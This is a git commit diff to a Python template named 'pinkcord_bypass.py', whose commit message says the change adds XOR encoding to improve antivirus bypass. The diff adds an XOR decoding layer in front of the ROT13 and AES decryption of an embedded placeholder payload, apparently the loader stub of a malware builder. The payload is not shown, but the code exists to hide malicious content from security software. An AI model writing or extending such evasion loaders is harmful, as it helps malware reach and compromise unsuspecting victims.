68eca2c4ed643752f8df9827b0ce18c332e9dd7d
xanonDev <52205282+xanonDev@users.noreply.github.com>
2023-08-29 12:55:45 +0200

    adding xor coding which improves antivirus bypass

--- src/template/pinkcord_bypass.py
+++ src/template/pinkcord_bypass.py
@@ -27,11 +27,20 @@ def decrypt_code(encrypted_text, key):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     decrypted_bytes = unpad(cipher.decrypt(ciphertext), AES.block_size)
     return decrypted_bytes.decode()
+def xor_to_text(xor_list, key):
+    text_result = ""
+    for xor_value in xor_list:
+        char = chr(xor_value ^ key)
+        text_result += char
+    return text_result
 
 while True:
     try:
         secert = "<BYPASS>"
         secretkey = "<BYPASS_KEY>"
+        xorkey = <XORKEY>
+        encoded_values = [int(value) for value in secert.strip('[]').split(', ')]
+        secert = xor_to_text(encoded_values, xorkey)
         secert = codecs.encode(secert, 'rot13')
         secert = decrypt_code(secert, base64.b64decode(secretkey))
         unsecret = codecs.encode(secert, 'rot13')
